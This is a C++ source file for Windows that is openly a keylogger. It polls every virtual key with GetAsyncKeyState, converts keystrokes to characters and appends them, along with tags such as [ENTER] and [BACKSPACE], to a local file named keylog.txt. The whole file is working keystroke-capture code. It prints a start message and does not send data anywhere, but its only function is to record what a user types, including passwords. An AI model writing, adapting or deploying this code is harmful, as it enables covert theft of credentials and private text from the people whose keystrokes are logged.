#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

// Function to save the pressed key to a file
void logKeyStroke(const string& key) {
    ofstream outFile;
    outFile.open("keylog.txt", ios::app); // Append mode
    if (outFile.is_open()) {
        outFile << key;
        outFile.close();
    }
}

// Function to handle special keys
void handleSpecialKeys(int key) {
    switch (key) {
        case VK_BACK:
            logKeyStroke("[BACKSPACE]");
            break;
        case VK_TAB:
            logKeyStroke("[TAB]");
            break;
        case VK_RETURN:
            logKeyStroke("[ENTER]");
            break;
        case VK_ESCAPE:
            logKeyStroke("[ESC]");
            break;
        case VK_SPACE:
            logKeyStroke("[SPACE]");
            break;
        case VK_SHIFT:
            logKeyStroke("[SHIFT]");
            break;
        case VK_CONTROL:
            logKeyStroke("[CTRL]");
            break;
        case VK_MENU: // Alt key
            logKeyStroke("[ALT]");
            break;
        default:
            break;
    }
}

// Keylogger function
void keyLogger() {
    // Display message that keylogger has started
    cout << "Keystroke logger has been started. Press Ctrl+C to stop." << endl;

    // Infinite loop to continuously monitor keystrokes
    while (true) {
        Sleep(10); // Sleep for 10 milliseconds to reduce CPU usage

        // Loop through all the virtual keys to check if any key is pressed
        for (int key = 0; key <= 255; key++) {
            if (GetAsyncKeyState(key) == -32767) { // Key is pressed
                // Check if the key is a special key
                if (key == VK_BACK || key == VK_TAB || key == VK_RETURN || key == VK_ESCAPE || key == VK_SPACE ||
                    key == VK_SHIFT || key == VK_CONTROL || key == VK_MENU ||
                    (key >= VK_OEM_1 && key <= VK_OEM_102) ||
                    (key >= VK_F1 && key <= VK_F24)) {
                    handleSpecialKeys(key);
                } else {
                    // Alphanumeric characters
                    BYTE keyboardState[256];
                    GetKeyboardState(keyboardState);
                    WCHAR buffer[5];
                    ToUnicodeEx(key, key, keyboardState, buffer, 4, 0, NULL);
                    char keyChar = static_cast<char>(buffer[0]);
                    logKeyStroke(string(1, keyChar));
                }
            }
        }
    }
}

int main() {
    keyLogger(); // Start the keylogger
    return 0;
}
